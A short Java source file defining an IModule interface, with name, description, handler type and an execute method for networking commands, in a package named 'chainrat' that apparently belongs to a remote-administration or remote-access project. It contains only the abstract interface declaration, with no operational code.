package com.nefi.chainrat;

import com.nefi.chainrat.networking.Command;

public interface IModule {
    String name();
    String description();
    CommandType handlerType();

    boolean execute(Command command);


}
